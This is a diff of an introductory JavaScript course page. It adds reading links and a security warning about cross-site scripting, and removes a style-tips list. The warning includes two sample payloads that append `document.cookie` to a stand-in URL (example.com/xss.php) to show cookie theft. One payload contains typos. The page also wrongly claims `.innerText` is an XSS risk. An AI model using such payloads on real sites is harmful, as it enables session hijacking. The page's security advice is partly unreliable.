@@ -1,5 +1,16 @@
 # Frontend scripting with Javascript
 
+> 🌐 Supporting learning material
+>
+> Javascript book: Ferguson, R. (2019). Beginning JavaScript: The Ultimate Guide to Modern JavaScript Development. [Link](https://limo.libis.be/primo-explore/fulldisplay?docid=TN_springer_s978-1-4842-4395-4_313453&context=PC&vid=VIVES_KATHO&search_scope=ALL_CONTENT&tab=all_content_tab&lang=nl_BE:) (you must first log in via [ limo](http://limo.libis.be/index.html#/vives) before you can use this link)
+>
+> Developer webpage: [Mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+>
+> LinkedIn Learning Course: [Learning the Javascript Language](https://www.linkedin.com/learning/learning-the-javascript-language-2/)
+> 
+> LinkedIn Learning Course: [Validating and processing Forms with Javascript - chapters 1-3](https://www.linkedin.com/learning/validating-and-processing-forms-with-javascript-and-php)
+
+
 **JavaScript** (JS) is a lightweight, interpreted programming language with top-notch features. Although best known as the web page scripting language, it is also used by many non-browser environments, such as node.js.
 
 The standard for JavaScript is ECMAScript. As of 2012, all modern browsers fully support ECMAScript 5.1. On June 17, 2015, ECMA International released the sixth major version of ECMAScript, officially called ECMAScript 2015, and more commonly referred to as ECMAScript 2015 or ES2015. Since then, the ECMAScript standards have been released on an annual basis.
@@ -7,16 +18,6 @@ The standard for JavaScript is ECMAScript. As of 2012, all modern browsers fully
 Don't confuse JavaScript with the Java programming language. Both "Java" and "JavaScript" are trademarks or registered trademarks of Oracle in the US and other countries. In contrast, the two programming languages ​​have very different syntax, semantics, and applications.
 
 Javascript allows web pages to be made more interactive by accessing and modifying the content and layout of a web page while the page is being viewed in the browser. i.e. Javascript allows you to make a web page **dynamic** so that it responds to what the user does. Every action that needs to be done takes place via a **script** and is processed by the browser, so on the **client-side**.
-
-::: tip 💡Supporting learning materials
-We recommend the following supporting learning materials:
-
-* Ferguson, R. (2019). Beginning JavaScript: The Ultimate Guide to Modern JavaScript Development. [Link](https://limo.libis.be/primo-explore/fulldisplay?docid=TN_springer_s978-1-4842-4395-4_313453&context=PC&vid=VIVES_KATHO&search_scope=ALL_CONTENT&tab=all_content_tab&lang=nl_BE:) (you must first log in via [ limo](http://limo.libis.be/index.html#/vives) before you can use this link)
-
-* [Mozilla developer page](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-
-* [LinkedIn Learning](https://www.academicsoftware.eu/) via Academic Software (choose Web Platform)
-:::
 
 ## Troubleshooting
 
@@ -36,6 +37,29 @@ console.log('Result : ' + total);
 
 Sometimes the error is a bit more complex and we need to debug.
 Have a look at the information on the [developer page of Chrome](https://developer.chrome.com/docs/devtools/javascript/)
+
+## The dangers of internet sources
+
+It's completly normal for a (starting) developer to use the internet as a source of information. Keep in mind that everyone can post something on the web, professionals, hobbyists and also people with bad intentions. **So always double check a source before implementing some code to your project!**
+
+:::danger ⛔Security risk
+
+Never use the `.innerHTML` or `.innerText` syntax, it entails huge **security risks**!
+
+Specifically **Cross-Site Scripting Attacks** (XSS). Below are two examples of how a hacker can access a user account with simple code:
+
+1. In this example we store cookie info in a variable that can then be sent to another server.
+
+```html
+<script>var adr='http://example.com/xss.php?cookie=' + escape(document.cookie);</script>
+```
+
+2. In this example we use a missing image with an HTML attribute to trigger code
+
+```html
+<img scr="http://nofile" onerror="adr='http.example.com/xss.php?'+escape(document.cookie)";>
+```
+:::
 
 ## Become familiar with the syntax
 
@@ -366,16 +390,6 @@ function checkUsername(e){
 let userName = document.getElementById('username');
 userName.addEventListener('blur', checkUsername, false);
 ```
-
-### Good practices
-
-* If you provide manual indentation, always use either spaces or tabs, but don't combine them.
-* Provide your code with comments so that your code is easier to understand.
-* Place spaces:
-  * after a `,`, `:`, `;` but not before it
-  * after an 'if', 'for', 'while' and 'function'
-  * before and after an operator (`==`, `<`, `&&`, `+`, ...)
-* Avoid using `var` to define a variable
 
 ### Using objects as a kind of class
 
